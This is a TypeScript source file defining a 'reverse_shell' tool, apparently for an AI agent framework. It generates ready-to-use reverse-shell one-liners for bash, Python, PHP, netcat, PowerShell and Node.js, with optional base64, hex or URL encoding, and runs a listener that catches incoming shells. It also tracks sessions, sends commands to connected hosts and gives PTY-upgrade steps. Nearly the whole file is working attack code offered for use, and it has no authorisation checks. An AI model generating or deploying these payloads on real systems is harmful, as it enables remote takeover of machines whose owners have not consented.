import { Tool } from "./tool"
import z from "zod"
import net from "net"
import fs from "fs"
import path from "path"
import os from "os"
import crypto from "crypto"

const DESCRIPTION =
  "Reverse shell handler with session manager: generate payloads, start listeners, manage sessions, upgrade to PTY."

const SESSION_DIR = path.join(os.tmpdir(), "cc-reverse-shells")
const PARAMETERS = z.object({
  action: z.enum(["generate", "listen", "sessions", "send", "kill", "upgrade"]).describe("Action to perform"),
  lhost: z.string().optional().describe("Listener IP (for generate)"),
  lport: z.number().int().min(1).max(65535).optional().describe("Listener port"),
  platform: z.enum(["linux", "windows", "macos", "all"]).optional().describe("Target platform for payload generation"),
  session: z.string().optional().describe("Session ID for send/kill/upgrade"),
  command: z.string().optional().describe("Command to execute on session"),
  encoding: z.enum(["none", "base64", "hex", "url"]).optional().describe("Output encoding for payloads"),
  format: z
    .enum([
      "bash",
      "python",
      "php",
      "perl",
      "ruby",
      "lua",
      "go",
      "powershell",
      "csharp",
      "vbs",
      "nc",
      "socat",
      "node",
      "java",
      "war",
      "rust",
      "awk",
    ])
    .optional()
    .describe("Payload format filter"),
})

function uid() {
  return crypto.randomBytes(4).toString("hex")
}

function encodeParameter(cmd: string, enc: string | undefined): string {
  if (enc === "base64") return Buffer.from(cmd).toString("base64")
  if (enc === "hex") return Buffer.from(cmd).toString("hex")
  if (enc === "url") return encodeURIComponent(cmd)
  return cmd
}

function generatePayloads(
  lhost: string,
  lport: number,
  plat: string,
  encoding: string | undefined,
  format: string | undefined,
): Record<string, string[]> {
  const all: Record<string, string[]> = {}
  if (!format || format === "bash") {
    if (plat === "all" || plat === "linux" || plat === "macos") {
      all["Bash"] = [
        "sh -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
        "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
      ]
    }
  }
  if (!format || format === "python") {
    if (plat === "all" || plat === "linux" || plat === "macos") {
      all["Python"] = [
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"" +
          lhost +
          '",' +
          lport +
          '));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\'',
      ]
    }
  }
  if (!format || format === "php") {
    all["PHP"] = ["php -r '$sock=fsockopen(\"" + lhost + '",' + lport + ');exec("/bin/sh -i <&3 >&3 2>&3");\'']
  }
  if (!format || format === "nc") {
    all["Netcat"] = [
      "nc -e /bin/sh " + lhost + " " + lport,
      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + lport + " >/tmp/f",
    ]
  }
  if (!format || format === "powershell") {
    all["PowerShell"] = [
      "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('" +
        lhost +
        "'," +
        lport +
        ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);iex $d|Out-String;$s.Write(([text.encoding]::ASCII).GetBytes((iex $d|Out-String)+'PS> '))};$c.Close()\"",
    ]
  }
  if (!format || format === "node") {
    all["Node.js"] = [
      "node -e \"var n=require('net'),s=require('child_process').spawn('/bin/sh'),c=new n.Socket();c.connect(" +
        lport +
        ",'" +
        lhost +
        "');c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);\"",
    ]
  }
  const encoded: Record<string, string[]> = {}
  for (const [lang, payloads] of Object.entries(all)) {
    encoded[lang] = payloads.map((p) => encodeParameter(p, encoding))
  }
  return encoded
}

type SessionInfo = { id: string; socket: net.Socket; platform: string; connected: number }
const sessions: Map<string, SessionInfo> = new Map()
const listeners: Map<number, net.Server> = new Map()

function readSessions() {
  try {
    if (!fs.existsSync(SESSION_DIR)) return []
    const files = fs.readdirSync(SESSION_DIR).filter((f) => f.endsWith(".json"))
    return files.map((f) => JSON.parse(fs.readFileSync(path.join(SESSION_DIR, f), "utf-8")))
  } catch {
    return []
  }
}

function writeSession(id: string, data: Record<string, unknown>) {
  fs.mkdirSync(SESSION_DIR, { recursive: true })
  fs.writeFileSync(path.join(SESSION_DIR, id + ".json"), JSON.stringify({ id, ...data, updated: Date.now() }, null, 2))
}

function formatSession(data: Record<string, unknown>): string {
  const age = data.connected ? Math.floor((Date.now() - (data.connected as number)) / 1000) : 0
  return (
    "| `" +
    data.id +
    "` | " +
    (data.platform || "?") +
    " | " +
    (data.remote || "?") +
    " | " +
    Math.floor(age / 60) +
    "m " +
    (age % 60) +
    "s | " +
    (data.active ? "ACTIVE" : "DEAD") +
    " |"
  )
}

function listenOnPort(lport: number): Promise<{ ok: boolean; error?: string }> {
  return new Promise((resolve) => {
    const server = net.createServer((socket) => {
      const sid = uid()
      const remote = socket.remoteAddress + ":" + socket.remotePort
      sessions.set(sid, { id: sid, socket, platform: "unknown", connected: Date.now() })
      writeSession(sid, { platform: "unknown", remote, connected: Date.now(), active: true })
      socket.on("data", () => {})
      socket.on("close", () => {
        const s = sessions.get(sid)
        if (s) writeSession(sid, { platform: s.platform, remote, connected: s.connected, active: false })
        sessions.delete(sid)
      })
    })
    server.on("error", (err: NodeJS.ErrnoException) => {
      resolve({ ok: false, error: err.message })
    })
    server.listen(lport, "0.0.0.0", () => {
      listeners.set(lport, server)
      resolve({ ok: true })
    })
  })
}

async function sendCommand(
  sessionId: string,
  command: string,
): Promise<{ ok: boolean; output?: string; error?: string }> {
  const mem = sessions.get(sessionId)
  if (!mem || mem.socket.destroyed) return { ok: false, error: "session not found" }
  return new Promise((resolve) => {
    let result = ""
    const timeout = setTimeout(() => resolve({ ok: true, output: result || "(timeout - no output after 5s)" }), 5000)
    const onData = (data: Buffer) => {
      result += data.toString("utf-8")
    }
    mem.socket.on("data", onData)
    mem.socket.write(command + "\n")
    mem.socket.once("data", () => {
      setTimeout(() => {
        mem.socket.removeListener("data", onData)
        clearTimeout(timeout)
        resolve({ ok: true, output: result || "(empty response)" })
      }, 1000)
    })
  })
}

export const ReverseShellTool = Tool.define("reverse_shell", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const { action } = params

    if (action === "generate") {
      const lhost = params.lhost || "10.10.14.5"
      const lport = params.lport || 4444
      const plat = params.platform || "all"
      const payloads = generatePayloads(lhost, lport, plat, params.encoding, params.format)
      const totalPayloads = Object.values(payloads).flat().length
      const totalFormats = Object.keys(payloads).length
      let output =
        "## Reverse Shell Payloads\n\n**Listener**: " +
        lhost +
        ":" +
        lport +
        "\n**Platform**: " +
        plat +
        "\n**Formats**: " +
        totalFormats +
        "\n**Total payloads**: " +
        totalPayloads +
        "\n"
      if (params.encoding) output += "**Encoding**: " + params.encoding + "\n"
      output += "\n### Set up listener:\n```bash\nnc -lvnp " + lport + "\n```\n"
      for (const [lang, pls] of Object.entries(payloads)) {
        output += "\n### " + lang + "\n\n"
        for (const p of pls) output += "```\n" + p + "\n```\n\n"
      }
      output +=
        "\n### PTY Upgrade:\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# CTRL+Z -> stty raw -echo; fg\n```\n"
      return {
        title: "Reverse Shell: " + totalFormats + " formats",
        output,
        metadata: { action, lhost, lport, platform: plat, totalFormats, totalPayloads },
      }
    }

    if (action === "listen") {
      const lport = params.lport || 4444
      const res = await listenOnPort(lport)
      if (res.ok) {
        return {
          title: "Listener started on :" + lport,
          output:
            "## Listener Started\n\n**Port**: " +
            lport +
            "\n**Status**: Listening\n\nCheck sessions with `reverse_shell sessions`.",
          metadata: { action, port: lport },
        }
      }
      return {
        title: "Listener failed",
        output: "## Listener Error\n\nPort " + lport + ": " + (res.error || "unknown error"),
        metadata: { action, port: lport, error: res.error },
      }
    }

    if (action === "sessions") {
      const activeSessions = readSessions()
      const memSessions = Array.from(sessions.values()).map((s) => ({
        id: s.id,
        platform: s.platform,
        remote: s.socket.remoteAddress,
        connected: s.connected,
        active: !s.socket.destroyed,
      }))
      let output = "## Reverse Shell Sessions\n\n"
      if (activeSessions.length === 0 && memSessions.length === 0) {
        output += "No sessions. Start a listener with `reverse_shell listen`.\n"
      } else {
        output += "| ID | Platform | Remote | Age | Status |\n|----|----------|--------|-----|--------|\n"
        for (const s of activeSessions) output += formatSession(s) + "\n"
        for (const s of memSessions) {
          if (!activeSessions.find((f: any) => f.id === s.id))
            output += formatSession(s as Record<string, unknown>) + "\n"
        }
      }
      output += "\nUpgrade: `reverse_shell upgrade --session <ID>`\n"
      return { title: "Sessions", output, metadata: { action, count: activeSessions.length + memSessions.length } }
    }

    if (action === "upgrade") {
      let detectedPlatform: string = params.platform || "linux"
      if (params.session) {
        const mem = sessions.get(params.session)
        if (mem) detectedPlatform = mem.platform
      }
      let output = "## PTY Upgrade\n\n**Platform**: " + detectedPlatform + "\n\n"
      if (detectedPlatform === "windows") {
        output += "```powershell\npowershell -NoP -NonI -Exec Bypass\n```\n"
      } else {
        output +=
          "```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# CTRL+Z; stty raw -echo; fg; export TERM=xterm\n```\n"
      }
      return { title: "PTY Upgrade", output, metadata: { action, platform: detectedPlatform } }
    }

    if (action === "send") {
      if (!params.session || !params.command) throw new Error("session and command required")
      const res = await sendCommand(params.session, params.command)
      if (res.ok) {
        return {
          title: "Command sent",
          output: "## Output\n\n```\n" + (res.output || "") + "\n```\n",
          metadata: { action, session: params.session },
        }
      }
      return {
        title: "Send failed",
        output: "## Error\n\n" + (res.error || "unknown"),
        metadata: { action, session: params.session, error: res.error },
      }
    }

    if (action === "kill") {
      const killed: string[] = []
      if (params.session) {
        const mem = sessions.get(params.session)
        if (mem) {
          mem.socket.destroy()
          sessions.delete(params.session)
          killed.push("session:" + params.session)
        }
      }
      if (params.lport) {
        const svr = listeners.get(params.lport)
        if (svr) {
          svr.close()
          listeners.delete(params.lport)
          killed.push("listener:" + params.lport)
        }
      }
      const output = killed.length ? "## Killed\n\n" + killed.map((k) => "- " + k).join("\n") : "## Nothing to kill"
      return { title: killed.length ? "Killed" : "Nothing killed", output, metadata: { action, killed } }
    }

    throw new Error("unknown action")
  },
}))
